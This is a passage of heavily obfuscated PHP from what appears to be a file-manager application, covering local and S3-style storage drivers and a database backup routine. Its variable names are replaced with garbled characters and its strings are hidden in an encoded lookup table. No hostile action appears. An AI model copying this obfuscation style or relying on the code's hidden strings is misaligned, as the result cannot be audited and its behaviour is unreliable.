mkfile($ñŞÉÅÅ­, $èêšº‡« = '', $ñ¶¿ÔÙš = REPEAT_RENAME) { $ñŞÉÅÅ­ = $this->iconvSystem($ñŞÉÅÅ­); @touch($ñŞÉÅÅ­); if ($èêšº‡«) { file_put_contents($ñŞÉÅÅ­, $èêšº‡«); } @chmod($ñŞÉÅÅ­, $this->pathAuth); return is_file($ñŞÉÅÅ­) ? $this->getPathOuter($ñŞÉÅÅ­) : !1; } public function mkdir($Ò¯ÔÙœ, $ˆŠ¾˜¹ß = REPEAT_SKIP) { $Ò¯ÔÙœ = $this->iconvSystem($Ò¯ÔÙœ); if (is_dir($Ò¯ÔÙœ)) { return $this->getPathOuter($Ò¯ÔÙœ); } @mkdir($Ò¯ÔÙœ, $this->pathAuth, !0); @chmod($Ò¯ÔÙœ, $this->pathAuth); return is_dir($Ò¯ÔÙœ) ? $this->getPathOuter($Ò¯ÔÙœ) : !1; } public function copyFile($Æ„Á¤·¬, $×Æ‚éøé) { $this->mkdir($this->pathFather($×Æ‚éøé)); $Æ„Á¤·¬ = $this->iconvSystem($Æ„Á¤·¬); $×Æ‚éøé = $this->iconvSystem($×Æ‚éøé); $€îŸÑŒ = copy_64($Æ„Á¤·¬, $×Æ‚éøé); @chmod($×Æ‚éøé, $this->pathAuth); return $€îŸÑŒ ? $this->getPathOuter($×Æ‚éøé) : !1; } public function moveFile($…ãš¾ùõ, $Ö¢á™¿¡) { $this->mkdir($this->pathFather($Ö¢á™¿¡)); $…ãš¾ùõ = $this->iconvSystem($…ãš¾ùõ); $Ö¢á™¿¡ = $this->iconvSystem($Ö¢á™¿¡); $Úî‰¢£® = intval(@rename($…ãš¾ùõ, $Ö¢á™¿¡)); if (!$Úî‰¢£®) { if ($Úî‰¢£® = intval(@copy_64($…ãš¾ùõ, $Ö¢á™¿¡))) { @unlink($…ãš¾ùõ); } } @chmod($Ö¢á™¿¡, $this->pathAuth); return $Úî‰¢£® ? $this->getPathOuter($Ö¢á™¿¡) : !1; } public function movePath($¤£Ë—éÇ, $±·™…ˆÉ, $Å¼ƒÛÃÆ = false) { $¨üöÇİü =& $_SERVER[ú‡®¯¨±]; $¤£Ë—éÇ = $this->iconvSystem($¤£Ë—éÇ); $±·™…ˆÉ = $this->iconvSystem($±·™…ˆÉ); $«öğÀ˜â = rtrim($±·™…ˆÉ, $¨üöÇİü[8]) . $¨üöÇİü[8] . ($Å¼ƒÛÃÆ ? $Å¼ƒÛÃÆ : get_path_this($¤£Ë—éÇ)); if (file_exists($«öğÀ˜â)) { return !1; } $¸Ñ§Ï† = intval(@rename($¤£Ë—éÇ, $«öğÀ˜â)); $¸Ñ§Ï† = file_exists($«öğÀ˜â); return $¸Ñ§Ï† ? $this->getPathOuter($«öğÀ˜â) : !1; } public function delFile($á¤ˆ¶³²) { $á¤ˆ¶³² = $this->iconvSystem($á¤ˆ¶³²); if (!@unlink($á¤ˆ¶³²)) { @chmod($á¤ˆ¶³², $this->pathAuth); if (!@unlink($á¤ˆ¶³²)) { return !1; } } else { return !0; } } public function delFolder($—˜áˆã€) { $ÆªˆƒŒÌ =& $_SERVER[ú‡®¯¨±]; $—˜áˆã€ = $this->iconvSystem($—˜áˆã€); if (!is_dir($—˜áˆã€)) { return !0; } if (!($ÌËºš·‡ = opendir($—˜áˆã€))) { return !1; } while (($£ÂÖóƒ™ = readdir($ÌËºš·‡)) !== !1) { if ($£ÂÖóƒ™ == $ÆªˆƒŒÌ[10] || $£ÂÖóƒ™ == $ÆªˆƒŒÌ[1334]) { continue; } $’³À­ÎÙ = $—˜áˆã€ . $ÆªˆƒŒÌ[8] . $£ÂÖóƒ™; if (is_file($’³À­ÎÙ) || is_link($’³À­ÎÙ)) { if (!unlink($’³À­ÎÙ)) { chmod($’³À­ÎÙ, $this->pathAuth); if (!unlink($’³À­ÎÙ)) { return !1; } } } else { if (is_dir($’³À­ÎÙ)) { chmod($’³À­ÎÙ, $this->pathAuth); $’³À­ÎÙ = $this->iconvApp($’³À­ÎÙ); if (!$this->delFolder($’³À­ÎÙ)) { return !1; } } } } closedir($ÌËºš·‡); return rmdir($—˜áˆã€); } public function rename($×Š‹ŒÓ”, $ÉÏáÀ²¡) { $ÑÍßÌä³ =& $_SERVER[ú‡®¯¨±]; $¢†¢Ï¡Ó = $this->fileNameAuto($this->pathFather($×Š‹ŒÓ”), $ÉÏáÀ²¡); $¢†¢Ï¡Ó = $this->iconvSystem($¢†¢Ï¡Ó); $×Š‹ŒÓ” = $this->iconvSystem($×Š‹ŒÓ”); $Ğù­ŸÕ§ = $this->pathFather($×Š‹ŒÓ”); $§ˆÎÛ¸Î = rtrim($Ğù­ŸÕ§, $ÑÍßÌä³[8]) . $ÑÍßÌä³[8] . $¢†¢Ï¡Ó; $õÕê×´æ = @rename($×Š‹ŒÓ”, $§ˆÎÛ¸Î); $§ˆÎÛ¸Î = $this->iconvApp($§ˆÎÛ¸Î); return $õÕê×´æ ? $this->getPathOuter($§ˆÎÛ¸Î) : !1; } public function size($°Ë¡ëõ ) { $°Ë¡ëõ  = $this->iconvSystem($°Ë¡ëõ ); return filesize_64($°Ë¡ëõ ); } public function info($¿åŞÇüë) { $¿åŞÇüë = $this->iconvSystem($¿åŞÇüë); if ($this->isFolder($¿åŞÇüë)) { return $this->folderInfo($¿åŞÇüë); } else { if ($this->isFile($¿åŞÇüë)) { return $this->fileInfo($¿åŞÇüë); } } return !1; } protected function infoChildren($–ªÂŸš, &$óª¥“½í, $¼Ê³Ï¢æ = true) { $ÚŸ²ş†‰ =& $_SERVER[ú‡®¯¨±]; check_abort_echo(); $–ªÂŸš = rtrim($–ªÂŸš, $ÚŸ²ş†‰[8]) . $ÚŸ²ş†‰[8]; if ($¼Ê³Ï¢æ) { $–ªÂŸš = $this->iconvSystem($–ªÂŸš); } if (!($òŸĞùñš = @opendir($–ªÂŸš))) { return; } while (($ü‰ÈÆó  = readdir($òŸĞùñš)) !== !1) { if ($ü‰ÈÆó  == $ÚŸ²ş†‰[10] || $ü‰ÈÆó  == $ÚŸ²ş†‰[1334]) { continue; } $ç¹Ô‡íÁ = $–ªÂŸš . $ü‰ÈÆó ; if (is_file($ç¹Ô‡íÁ) || is_link($ç¹Ô‡íÁ)) { $óª¥“½í[$ÚŸ²ş†‰[79]]++; $óª¥“½í[$ÚŸ²ş†‰[78]] += filesize_64($ç¹Ô‡íÁ); } else { if (is_dir($ç¹Ô‡íÁ)) { $óª¥“½í[$ÚŸ²ş†‰[80]]++; $this->infoChildren($ç¹Ô‡íÁ, $óª¥“½í, !1); } } } closedir($òŸĞùñš); } private function folderInfo($Âèœ…‡ó, $ÛŒÇ×ùš = false) { $Õ Ÿå =& $_SERVER[ú‡®¯¨±]; $Âèœ…‡ó = rtrim($Âèœ…‡ó, $Õ Ÿå[8]) . $Õ Ÿå[8]; $úÓÌÎı  = $this->iconvApp($this->pathThis($Âèœ…‡ó)); if ($ÛŒÇ×ùš) { return array($Õ Ÿå[32] => $úÓÌÎı , $Õ Ÿå[86] => $this->getPathOuter($Âèœ…‡ó), $Õ Ÿå[33] => $Õ Ÿå[77]); } $˜ØŠ©Š» = array($Õ Ÿå[32] => $úÓÌÎı , $Õ Ÿå[86] => $this->getPathOuter($Âèœ…‡ó), $Õ Ÿå[33] => $Õ Ÿå[77], $Õ Ÿå[227] => @filectime($Âèœ…‡ó), $Õ Ÿå[87] => @filemtime($Âèœ…‡ó), $Õ Ÿå[1419] => @fileatime($Âèœ…‡ó), $Õ Ÿå[1420] => is_readable($Âèœ…‡ó), $Õ Ÿå[1421] => is_writable($Âèœ…‡ó), $Õ Ÿå[1422] => get_mode($Âèœ…‡ó)); return $˜ØŠ©Š»; } private function fileInfo($¥ğÃ™¾, $•÷ß”›× = false) { $Ç—Õ‘çß =& $_SERVER[ú‡®¯¨±]; $Œî¢Ñµ = $this->iconvApp($this->pathThis($¥ğÃ™¾)); if ($•÷ß”›×) { return array($Ç—Õ‘çß[32] => $Œî¢Ñµ, $Ç—Õ‘çß[86] => $this->getPathOuter($¥ğÃ™¾), $Ç—Õ‘çß[33] => $Ç—Õ‘çß[226], $Ç—Õ‘çß[78] => $this->size($¥ğÃ™¾), $Ç—Õ‘çß[177] => $this->ext($Œî¢Ñµ)); } $óõÅ‚Ãœ = array($Ç—Õ‘çß[32] => $Œî¢Ñµ, $Ç—Õ‘çß[86] => $this->getPathOuter($¥ğÃ™¾), $Ç—Õ‘çß[33] => $Ç—Õ‘çß[226], $Ç—Õ‘çß[227] => @filectime($¥ğÃ™¾), $Ç—Õ‘çß[87] => @filemtime($¥ğÃ™¾), $Ç—Õ‘çß[1419] => @fileatime($¥ğÃ™¾), $Ç—Õ‘çß[78] => $this->size($¥ğÃ™¾), $Ç—Õ‘çß[177] => $this->ext($Œî¢Ñµ), $Ç—Õ‘çß[1420] => is_readable($¥ğÃ™¾), $Ç—Õ‘çß[1421] => is_writable($¥ğÃ™¾), $Ç—Õ‘çß[1422] => get_mode($¥ğÃ™¾)); return $óõÅ‚Ãœ; } public function exist($ÏŒ¿Í‡Õ) { $ÏŒ¿Í‡Õ = $this->iconvSystem($ÏŒ¿Í‡Õ); return @file_exists($ÏŒ¿Í‡Õ); } public function isFile($Ì±êù¦§) { $Ì±êù¦§ = $this->iconvSystem($Ì±êù¦§); return @is_file($Ì±êù¦§); } public function isFolder($¥ŞœÉ·ğ) { $¥ŞœÉ·ğ = $this->iconvSystem($¥ŞœÉ·ğ); return @is_dir($¥ŞœÉ·ğ); } public function listPath($˜«‘ßÉ¤, $û½¦»õö = false) { $º¬èƒ‡ô =& $_SERVER[ú‡®¯¨±]; $˜«‘ßÉ¤ = $this->iconvSystem($˜«‘ßÉ¤); $˜«‘ßÉ¤ = rtrim($˜«‘ßÉ¤, $º¬èƒ‡ô[8]) . $º¬èƒ‡ô[8]; $€²ı–Ùï = array($º¬èƒ‡ô[84] => array(), $º¬èƒ‡ô[85] => array()); if (!($œÙ™ù÷İ = @opendir($˜«‘ßÉ¤))) { return $€²ı–Ùï; } while (($€Ô˜ß½í = readdir($œÙ™ù÷İ)) !== !1) { if ($€Ô˜ß½í == $º¬èƒ‡ô[10] || $€Ô˜ß½í == $º¬èƒ‡ô[1334]) { continue; } $éä¼€²‘ = $˜«‘ßÉ¤ . $€Ô˜ß½í; if (is_file($éä¼€²‘)) { $€²ı–Ùï[$º¬èƒ‡ô[85]][] = $this->fileInfo($éä¼€²‘, $û½¦»õö); } else { $€²ı–Ùï[$º¬èƒ‡ô[84]][] = $this->folderInfo($éä¼€²‘, $û½¦»õö); } } closedir($œÙ™ù÷İ); return $€²ı–Ùï; } public function listAll($€¤îˆ«ñ, &$óïÇ¢œ = array()) { $óÈ«éˆŞ =& $_SERVER[ú‡®¯¨±]; $€¤îˆ«ñ = $this->iconvSystem($€¤îˆ«ñ); $€¤îˆ«ñ = rtrim($€¤îˆ«ñ, $óÈ«éˆŞ[8]) . $óÈ«éˆŞ[8]; if (!($ï ¾‘´Á = @opendir($€¤îˆ«ñ))) { return $óïÇ¢œ; } while (($½ùØ©®ë = readdir($ï ¾‘´Á)) !== !1) { if ($½ùØ©®ë == $óÈ«éˆŞ[10] || $½ùØ©®ë == $óÈ«éˆŞ[1334]) { continue; } $²–İ§À = $€¤îˆ«ñ . $½ùØ©®ë; $¼óï–”º = is_dir($²–İ§À) && !is_link($²–İ§À) ? 1 : 0; $²–İ§À = $¼óï–”º ? $²–İ§À . $óÈ«éˆŞ[8] : $²–İ§À; $óïÇ¢œ[] = array($óÈ«éˆŞ[86] => $²–İ§À, $óÈ«éˆŞ[77] => $¼óï–”º, $óÈ«éˆŞ[87] => intval(@filemtime($²–İ§À)), $óÈ«éˆŞ[78] => $¼óï–”º ? 0 : intval($this->size($²–İ§À))); if ($¼óï–”º) { $this->listAll($²–İ§À, $óïÇ¢œ); } } closedir($ï ¾‘´Á); return $óïÇ¢œ; } public function has($œµŠÆšÍ, $ôë˜Åû = false, $Êã€Û¶§ = true) { $´˜áø¡¤ =& $_SERVER[ú‡®¯¨±]; $œµŠÆšÍ = $this->iconvSystem($œµŠÆšÍ); $œµŠÆšÍ = rtrim($œµŠÆšÍ, $´˜áø¡¤[8]) . $´˜áø¡¤[8]; if (!($¶ˆÀÀé = @opendir($œµŠÆšÍ))) { return !1; } $Ö††—Æ¯ = 0; $òÒÎÈÀ = 0; $­–³€¶‘ = 0; while (($á™Ì¨•‹ = readdir($¶ˆÀÀé)) !== !1) { if ($á™Ì¨•‹ == $´˜áø¡¤[10] || $á™Ì¨•‹ == $´˜áø¡¤[1334]) { continue; } $Éê¿¡±õ = $œµŠÆšÍ . $á™Ì¨•‹; if ($ôë˜Åû) { $­–³€¶‘++; if (@is_file($Éê¿¡±õ)) { $Ö††—Æ¯++; } else { $òÒÎÈÀ++; } if ($­–³€¶‘ > 10000) { break; } continue; } if ($Êã€Û¶§) { if (@is_file($Éê¿¡±õ)) { return !0; } } else { if (@is_dir($Éê¿¡±õ . $´˜áø¡¤[8])) { return !0; } } } closedir($¶ˆÀÀé); if ($ôë˜Åû) { return array($´˜áø¡¤[235] => $Ö††—Æ¯, $´˜áø¡¤[236] => $òÒÎÈÀ); } return !1; } public function hashSimple($Ëïœƒ£¦) { $ÀÁôÍãá =& $_SERVER[ú‡®¯¨±]; if (!$Ëïœƒ£¦) { return md5($ÀÁôÍãá[12]); } $Ëïœƒ£¦ = $this->iconvSystem($Ëïœƒ£¦); $šœñÉ›œ = $this->size($Ëïœƒ£¦); $ƒæĞÈƒÌ = 200; $ôƒˆßô÷ = 50; if ($šœñÉ›œ <= $ƒæĞÈƒÌ * $ôƒˆßô÷) { return $this->hashMd5($Ëïœƒ£¦) . $šœñÉ›œ; } $ÓÍ£×§­ = $ÀÁôÍãá[12]; $™÷ÄÀôÚ = intval($šœñÉ›œ / $ôƒˆßô÷); $¹ÆãâÖ¢ = fopen($Ëïœƒ£¦, $ÀÁôÍãá[1423]); if (!$¹ÆãâÖ¢) { return $ÓÍ£×§­; } for ($§¨°÷Ïª = 0; $§¨°÷Ïª < $ôƒˆßô÷; $§¨°÷Ïª++) { fseek_64($¹ÆãâÖ¢, $™÷ÄÀôÚ * $§¨°÷Ïª); $ÓÍ£×§­ .= fread($¹ÆãâÖ¢, $ƒæĞÈƒÌ); } fseek_64($¹ÆãâÖ¢, $šœñÉ›œ - $ƒæĞÈƒÌ); $ÓÍ£×§­ .= fread($¹ÆãâÖ¢, $ƒæĞÈƒÌ); fclose($¹ÆãâÖ¢); return md5($ÓÍ£×§­) . $šœñÉ›œ; } public function getContent($¨ãÒš) { $¨ãÒš = $this->iconvSystem($¨ãÒš); return file_get_contents($¨ãÒš); } public function setContent($ä¤›û§‹, $ëûÉ¯¡Ì = '') { $ä¤›û§‹ = $this->iconvSystem($ä¤›û§‹); $‰½Ğ—­ = @file_put_contents($ä¤›û§‹, $ëûÉ¯¡Ì, LOCK_EX); clearstatcache(); @chmod($ä¤›û§‹, $this->pathAuth); return $‰½Ğ—­ === !1 ? !1 : !0; } public function fileSubstr($÷ÂıéÍ, $ôÁú¦ÑÖ = 0, $¶µÄû‹ı = false) { $—ÛòÇÚ× =& $_SERVER[ú‡®¯¨±]; $÷ÂıéÍ = $this->iconvSystem($÷ÂıéÍ); if ($¶µÄû‹ı === !1) { $¶µÄû‹ı = $this->size($÷ÂıéÍ); } if ($¶µÄû‹ı <= 0) { return $—ÛòÇÚ×[12]; } $†ÁÑ¢ñ÷ = fopen($÷ÂıéÍ, $—ÛòÇÚ×[1423]); if (!$†ÁÑ¢ñ÷) { return !1; } fseek_64($†ÁÑ¢ñ÷, $ôÁú¦ÑÖ); $º¤†ë®è = fread($†ÁÑ¢ñ÷, $¶µÄû‹ı); fclose($†ÁÑ¢ñ÷); return $º¤†ë®è; } public function upload($òÓ÷Éõç, $¸ê›ä®ç, $í¶®¸û² = false, $•õ»’óÍ = REPEAT_REPLACE) { if ($í¶®¸û²) { return $this->moveFile($¸ê›ä®ç, $òÓ÷Éõç); } return $this->copyFile($¸ê›ä®ç, $òÓ÷Éõç); } public function setModifyTime($°Ğúüìù, $†ˆÏ¨Ôì = '') { @touch($°Ğúüìù, intval($†ˆÏ¨Ôì)); } public function download($âÚìŸáŒ, $£óµÖ³ş) { return $this->iconvSystem($âÚìŸáŒ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($‡ªª˜ÌÁ) { parent::__construct($‡ªª˜ÌÁ); $this->signatureVersion($_SERVER[ú‡®¯¨±][243]); } public function fileOutImage($ó® óÑ, $ÖÃÚµ = 250) { $‡†Ú—ŞŸ =& $_SERVER[ú‡®¯¨±]; if ($this->size($ó® óÑ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ó® óÑ, $ÖÃÚµ); } $Ğ¤å– = array($‡†Ú—ŞŸ[1424] => $‡†Ú—ŞŸ[1425] . $ÖÃÚµ . $‡†Ú—ŞŸ[1426]); $ßöÆÁ£‰ = $this->link($ó® óÑ, $Ğ¤å–); $this->fileOutLink($ßöÆÁ£‰); } public function fileOutLink($ˆ¾¡¸¶) { $¥»šøà =& $_SERVER[ú‡®¯¨±]; if (substr($ˆ¾¡¸¶, 0, 7) == $¥»šøà[1387]) { $ˆ¾¡¸¶ = $¥»šøà[1388] . substr($ˆ¾¡¸¶, 7); } header($¥»šøà[164] . $ˆ¾¡¸¶); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($™àßŸë) { parent::__construct($™àßŸë); $this->signatureVersion($_SERVER[ú‡®¯¨±][243]); } public function fileOutLink($Êé±ªŒ) { $äÄôÙÆµ =& $_SERVER[ú‡®¯¨±]; if (substr($Êé±ªŒ, 0, 7) == $äÄôÙÆµ[1387]) { $Êé±ªŒ = $äÄôÙÆµ[1388] . substr($Êé±ªŒ, 7); } header($äÄôÙÆµ[164] . $Êé±ªŒ); die; } } goto b²ùƒÉ¹›ß; F™›Š¾Ïö°: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $•Ìáß¤ë =& $_SERVER[ú‡®¯¨±]; $this->isManual(); self::$name = date($•Ìáß¤ë[803]); if (!($æş·Æªã = Model($•Ìáß¤ë[804])->lastItem())) { $æş·Æªã = $this->initData(); } else { self::$name = $æş·Æªã[$•Ìáß¤ë[32]]; if ($æş·Æªã[$•Ìáß¤ë[805]] == $•Ìáß¤ë[90]) { self::$name = date($•Ìáß¤ë[266]); $÷­ñéƒ = 0; if (isset($æş·Æªã[$•Ìáß¤ë[348]][$•Ìáß¤ë[226]][$•Ìáß¤ë[519]])) { $÷­ñéƒ = (int) $æş·Æªã[$•Ìáß¤ë[348]][$•Ìáß¤ë[226]][$•Ìáß¤ë[519]]; } if (self::$manual == 0 && $æş·Æªã[$•Ìáß¤ë[32]] == self::$name) { Model($•Ìáß¤ë[804])->remove($æş·Æªã[$•Ìáß¤ë[453]]); } $æş·Æªã = $this->initData($÷­ñéƒ, $æş·Æªã[$•Ìáß¤ë[806]]); } else { $this->checkStore($æş·Æªã[$•Ìáß¤ë[806]]); } } self::$option = $æş·Æªã; } private function isManual() { $—À†ü¯À = _get($GLOBALS, $_SERVER[ú‡®¯¨±][807], 0); $—À†ü¯À = intval($—À†ü¯À); self::$manual = $—À†ü¯À && $—À†ü¯À == 1 ? 1 : 0; } private function initData($ÅĞä£È€ = 0, $•î…ä×Œ = '') { $º¿’€Ê› =& $_SERVER[ú‡®¯¨±]; $‡¨¶ÊÜµ = Model($º¿’€Ê›[804])->config(); if ($•î…ä×Œ && $‡¨¶ÊÜµ[$º¿’€Ê›[806]] != $•î…ä×Œ) { $ÅĞä£È€ = 0; } $this->checkStore($‡¨¶ÊÜµ[$º¿’€Ê›[806]]); if (self::$manual == 1) { self::$name .= $º¿’€Ê›[11] . date($º¿’€Ê›[808]); } $çÉ‹¡–Ô = array($º¿’€Ê›[806] => $‡¨¶ÊÜµ[$º¿’€Ê›[806]], $º¿’€Ê›[32] => self::$name, $º¿’€Ê›[805] => 0, $º¿’€Ê›[809] => $‡¨¶ÊÜµ[$º¿’€Ê›[809]], $º¿’€Ê›[810] => self::$manual, $º¿’€Ê›[348] => array($º¿’€Ê›[811] => array($º¿’€Ê›[805] => 0), $º¿’€Ê›[812] => array($º¿’€Ê›[805] => 0, $º¿’€Ê›[813] => 0, $º¿’€Ê›[814] => 0, $º¿’€Ê›[33] => $º¿’€Ê›[12], $º¿’€Ê›[815] => 0, $º¿’€Ê›[816] => 0), $º¿’€Ê›[817] => array($º¿’€Ê›[805] => 0, $º¿’€Ê›[813] => 0, $º¿’€Ê›[814] => 0, $º¿’€Ê›[815] => 0, $º¿’€Ê›[816] => 0), $º¿’€Ê›[226] => array($º¿’€Ê›[805] => 0, $º¿’€Ê›[818] => 0, $º¿’€Ê›[819] => 0, $º¿’€Ê›[820] => 0, $º¿’€Ê›[821] => 0, $º¿’€Ê›[519] => $ÅĞä£È€, $º¿’€Ê›[815] => 0, $º¿’€Ê›[816] => 0)), $º¿’€Ê›[815] => time(), $º¿’€Ê›[816] => 0); $ŸÚ«“ÎÇ = Model($º¿’€Ê›[804])->insert($çÉ‹¡–Ô); $çÉ‹¡–Ô[$º¿’€Ê›[453]] = $ŸÚ«“ÎÇ; return $çÉ‹¡–Ô; } private function checkStore($Û¢œÚÏã) { $†À”Èï– =& $_SERVER[ú‡®¯¨±]; $’œëõ× = Model($†À”Èï–[822])->listData($Û¢œÚÏã); Model($†À”Èï–[822])->checkConfig($’œëõ×); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ú‡®¯¨±][804])->findByName(self::$name); } return self::$option; } public static function set($Œñ–ğÏµ) { $ÖˆÁóİ =& $_SERVER[ú‡®¯¨±]; $…åÆÃ½» = self::get(); foreach ($Œñ–ğÏµ as $‘üääû => $¬ûÅ‘ÜÇ) { $çÊéª¹â = explode($ÖˆÁóİ[10], $‘üääû); $°Ô¡Ù’› = count($çÊéª¹â); switch ($°Ô¡Ù’›) { case 1: $…åÆÃ½»[$çÊéª¹â[0]] = $¬ûÅ‘ÜÇ; break; case 2: $…åÆÃ½»[$çÊéª¹â[0]][$çÊéª¹â[1]] = $¬ûÅ‘ÜÇ; break; case 3: $…åÆÃ½»[$çÊéª¹â[0]][$çÊéª¹â[1]][$çÊéª¹â[2]] = $¬ûÅ‘ÜÇ; break; } } Model($ÖˆÁóİ[804])->update($…åÆÃ½»[$ÖˆÁóİ[453]], $…åÆÃ½»); self::$option = $…åÆÃ½»; return self::$option; } public function keep() { $†ÃÕ»À€ =& $_SERVER[ú‡®¯¨±]; $ÙÉÊõ ù = self::get(); if ($ÙÉÊõ ù[$†ÃÕ»À€[348]][$†ÃÕ»À€[811]][$†ÃÕ»À€[805]] == $†ÃÕ»À€[90]) { return; } $this->backupKeep($ÙÉÊõ ù); self::set(array($†ÃÕ»À€[823] => 1)); } private function backupKeep($€şºÔÂ¦) { $è²Ï¬¡Ï =& $_SERVER[ú‡®¯¨±]; if (self::$manual == 1) { return; } $ÊÍÂòÑŠ = Model($è²Ï¬¡Ï[804])->listData(); if (empty($ÊÍÂòÑŠ)) { return; } $Ÿ’ì±¡ = 0; $ÉöÓè = array(); foreach ($ÊÍÂòÑŠ as $ø ”şš) { if ($Ÿ’ì±¡ >= 7) { break; } $ÉöÓè[] = $ø ”şš[$è²Ï¬¡Ï[32]]; $Ÿ’ì±¡++; } for ($Ÿ’ì±¡ = 0; $Ÿ’ì±¡ < 12; $Ÿ’ì±¡++) { $ÉöÓè[] = date($è²Ï¬¡Ï[824], strtotime("\x2d{$Ÿ’ì±¡}\x20\155\x6f\x6e\164\150\x73")); } $ÉöÓè = array_unique($ÉöÓè); $ßŠ¸—è¢ = Model($è²Ï¬¡Ï[825])->get($è²Ï¬¡Ï[826]); foreach ($ÊÍÂòÑŠ as $ø ”şš) { if (isset($ø ”şš[$è²Ï¬¡Ï[810]]) && $ø ”şš[$è²Ï¬¡Ï[810]] == $è²Ï¬¡Ï[90]) { continue; } if (!empty($ø ”şš[$è²Ï¬¡Ï[32]]) && in_array($ø ”şš[$è²Ï¬¡Ï[32]], $ÉöÓè)) { continue; } Model($è²Ï¬¡Ï[804])->remove($ø ”şš[$è²Ï¬¡Ï[453]]); $–âãÎ±¿ = $this->backupPath($€şºÔÂ¦, $ßŠ¸—è¢); IO::remove($–âãÎ±¿, !1); } } private function backupPath($æ“°ù“, $Ñß¤³› = false) { $Œ¿Ç–®à =& $_SERVER[ú‡®¯¨±]; if (!$Ñß¤³›) { $Ñß¤³› = Model($Œ¿Ç–®à[825])->get($Œ¿Ç–®à[826]); } $›‹®š = $æ“°ù“[$Œ¿Ç–®à[32]]; $Å°îÂô = substr(md5($Œ¿Ç–®à[827] . $Ñß¤³› . $›‹®š), 0, 8); return "\173\151\x6f\x3a{$æ“°ù“[$Œ¿Ç–®à[806]]}\175\x2f\144\141\164\x61\x62\x61\x73\145\57\x62\x61\143\x6b\x75\x70\57" . $›‹®š . $Œ¿Ç–®à[11] . $Å°îÂô; } public function db() { $Û®èÊË =& $_SERVER[ú‡®¯¨±]; $ÔüïíÀÑ = self::get(); if ($ÔüïíÀÑ[$Û®èÊË[348]][$Û®èÊË[812]][$Û®èÊË[805]] == $Û®èÊË[90]) { return !0; } $–¤Ë¼É = new BackupDb(); if (!$–¤Ë¼É->index()) { return !1; } self::set(array($Û®èÊË[828] => 1)); return !0; } public function dbFile() { $¢Å•‹ä® =& $_SERVER[ú‡®¯¨±]; $æßÄîƒ“ = self::get(); if ($æßÄîƒ“[$¢Å•‹ä®[348]][$¢Å•‹ä®[817]][$¢Å•‹ä®[805]] == $¢Å•‹ä®[90]) { return !0; } $½ïøç¬² = new BackupDbFile(); if (!$½ïøç¬²->index()) { return !1; } self::set(array($¢Å•‹ä®[829] => 1)); return !0; } public function file() { $¾ñŸöê— =& $_SERVER[ú‡®¯¨±]; $€¾Åôü¶ = self::get(); if ($€¾Åôü¶[$¾ñŸöê—[348]][$¾ñŸöê—[226]][$¾ñŸöê—[805]] == $¾ñŸöê—[90]) { return !0; } if (!isset($€¾Åôü¶[$¾ñŸöê—[809]]) || $€¾Åôü¶[$¾ñŸöê—[809]] == $¾ñŸöê—[224]) { $Æ°¼ı™ = new BackupFile(); if (!$Æ°¼ı™->index()) { return !1; } } self::set(array($¾ñŸöê—[830] => 1, $¾ñŸöê—[805] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¦“°Ê =& $_SERVER[ú‡®¯¨±]; $®Àˆ¼Äæ = Backup::get(); self::$io = $®Àˆ¼Äæ[$¦“°Ê[806]]; self::$name = $®Àˆ¼Äæ[$¦“°Ê[32]]; $İóò¶Ä = new DbManage(); $Öìš‘Ò = $İóò¶Ä->dbType(); $ò¸¶îÕÀ = array($¦“°Ê[831] => $Öìš‘Ò, $¦“°Ê[832] => time()); Backup::set($ò¸¶îÕÀ); $çÄÍ˜’³ = $this->tmpFilesPath() . $¦“°Ê[833] . self::$name . $¦“°Ê[8]; del_dir($çÄÍ˜’³); mk_dir($çÄÍ˜’³); $ıÇ‹–Î¶ = $óÍİ…§ó = 0; $ïƒãîî¼ = new Task($¦“°Ê[834], $¦“°Ê[835], 0, LNG($¦“°Ê[836]) . $¦“°Ê[837] . LNG($¦“°Ê[838])); try { $¥ÒçÓçú = $İóò¶Ä->db()->getTables(); } catch (Exception $²‚¸Äš·) { $ïƒãîî¼->end(); return !1; } $¥ÒçÓçú = array_diff($¥ÒçÓçú, array($¦“°Ê[839], $¦“°Ê[840])); foreach ($¥ÒçÓçú as $³ÉÈè·) { $ıÇ‹–Î¶ += $İóò¶Ä->model($³ÉÈè·)->count(); } $ïƒãîî¼->task[$¦“°Ê[841]] = $ıÇ‹–Î¶; $GLOBALS[$¦“°Ê[842]] = self::$name; foreach ($¥ÒçÓçú as $³ÉÈè·) { $ášğÔ÷ = $çÄÍ˜’³ . $³ÉÈè· . $¦“°Ê[843]; $º ƒÔ = null; if ($³ÉÈè· == $¦“°Ê[844] && (!isset($®Àˆ¼Äæ[$¦“°Ê[809]]) || $®Àˆ¼Äæ[$¦“°Ê[809]] == $¦“°Ê[224])) { $º ƒÔ = self::$io; } $óÍİ…§ó += $İóò¶Ä->sqlFromDb($³ÉÈè·, $ášğÔ÷, $ïƒãîî¼, $º ƒÔ); } unset($GLOBALS[$¦“°Ê[842]]); $ïƒãîî¼->end(); if ($óÍİ…§ó > $ıÇ‹–Î¶) { $ıÇ‹–Î¶ = $óÍİ…§ó; } $ò¸¶îÕÀ = array($¦“°Ê[831] => $Öìš‘Ò, $¦“°Ê[828] => 1, $¦“°Ê[845] => $ıÇ‹–Î¶, $¦“°Ê[846] => $óÍİ…§ó, $¦“°Ê[847] => time()); Backup::set($ò¸¶îÕÀ); if ($ıÇ‹–Î¶ - $óÍİ…§ó > 0) { $‹ á¢”ç = $¦“°Ê[848]; if (stristr(I18n::getType(), $¦“°Ê[849])) { $‹ á¢”ç = $¦“°Ê[850]; } write_log(array($‹ á¢”ç, $ò¸¶îÕÀ), $¦“°Ê[835]); return !1; } return !0; } private function tmpFilesPath() { $ÃŸ×Ê¯ =& $_SERVER[ú‡®¯¨±]; $¼Ë¢æª = TEMP_FILES; if ($GLOBALS[$ÃŸ×Ê¯[6]][$ÃŸ×Ê¯[91]][$ÃŸ×Ê¯[851]]) { $¼Ë¢æª = $GLOBALS[$ÃŸ×Ê¯[6]][$ÃŸ×Ê¯[91]][$ÃŸ×Ê¯[851]]; if (!mk_dir($¼Ë¢æª) || !is_writable($¼Ë¢æª) || !IO::mkfile($¼Ë¢æª . $ÃŸ×Ê¯[852])) { $¼Ë¢æª = TEMP_FILES; } } return $¼Ë¢æª; } } class BackupDbFile { 